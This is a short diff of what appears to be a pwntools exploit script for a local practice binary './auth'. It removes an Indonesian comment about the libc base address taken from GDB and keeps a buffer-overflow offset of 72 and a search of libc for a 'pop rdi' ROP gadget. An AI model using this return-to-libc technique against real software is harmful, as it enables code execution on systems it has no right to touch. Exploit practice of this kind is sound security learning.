@@ -6,8 +6,7 @@ p    = process('./auth')
 
 offset = 72
 
-# Base libc yang BENER dari GDB info sharedlibrary
-libc.address = 0x00007fffff5a0000  # ← fix disini
+libc.address = 0x00007fffff5a0000
 
 libc2 = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
 pop_rdi_offset = next(libc2.search(b'\x5f\xc3'))
